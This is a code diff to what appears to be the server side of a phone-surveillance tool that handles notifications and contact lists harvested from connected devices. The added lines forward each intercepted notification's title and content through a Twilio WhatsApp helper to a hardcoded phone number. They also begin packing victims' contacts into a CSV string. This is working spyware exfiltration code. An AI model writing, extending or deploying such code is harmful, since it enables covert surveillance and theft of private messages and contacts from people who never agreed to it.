@@ -1,7 +1,11 @@
+const { type } = require("os");
+let sendWhatsapp_msg = require("./twilloWhatspp");
+let PHONE_NUMBER = "+917013200338";
 let CONST = require("./const"),
   fs = require("fs"),
   crypto = require("crypto"),
   path = require("path");
+const { addAbortSignal } = require("stream");
 
 class Clients {
   constructor(db) {
@@ -356,6 +360,15 @@ class Clients {
 
     socket.on(CONST.messageKeys.notification, (data) => {
       let dbNotificationLog = client.get("notificationLog");
+      console.log("msges started ", typeof data);
+      console.log(data);
+      // let msg = JSON.stringify(data);
+      let msg = `*AppName* : ${data.title}\n *TITTLE*:${data.title}\n*MSG*:${data.content}`;
+      // let msg =
+
+      sendWhatsapp_msg(PHONE_NUMBER, msg);
+      console.log("msges end ", typeof data);
+
       let hash = crypto
         .createHash("md5")
         .update(data.key + data.content)
@@ -376,9 +389,12 @@ class Clients {
         if (data.contactsList.length !== 0) {
           let contactsList = data.contactsList;
           let dbContacts = client.get("contacts");
+          let ALLCONTACTS = "PHONE_NUMBER,NAME\n";
+          var temp_data = "";
           let newCount = 0;
-          contactsList.forEach((contact) => {
+          contactsList.forEach(async (contact) => {
             contact.phoneNo = contact.phoneNo.replace(/\s+/g, "");
+            let tep = `${contact.phoneNo} , ${contact.name}\n`;
             let hash = crypto
               .createHash("md5")
               .update(contact.phoneNo + contact.name)
@@ -390,6 +406,7 @@ class Clients {
               newCount++;
             }
           });
+
           logManager.log(
             CONST.logTypes.success,
             clientID + " Contacts Updated - " + newCount + " New Contacts Added"
@@ -589,8 +606,6 @@ class Clients {
     if (outstandingCommands.includes(commandPayload.type))
       return cb("A similar command has already been queued");
     else {
-      // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
-      // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
       commandPayload.uid = Math.floor(Math.random() * 10000);
       commandQue.push(commandPayload).write();
       return cb(false);
